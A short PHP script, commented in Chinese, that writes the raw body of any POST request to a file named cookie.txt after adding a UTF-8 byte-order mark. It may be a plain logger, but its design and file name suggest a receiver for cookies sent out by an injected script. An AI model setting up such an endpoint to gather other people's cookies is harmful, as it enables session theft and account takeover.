<?php
 echo ".";
 $raw_post_data = file_get_contents('php://input', 'r');
 //寫入日誌檔
 $myfile = fopen("cookie.txt","w+") or die("Unable to open file!");
 fwrite($myfile, "\xEF\xBB\xBF".$raw_post_data); //在字串前加入\xEF\xBB\xBF轉成utf8格式 大小寫有差
 fclose($myfile);
?>
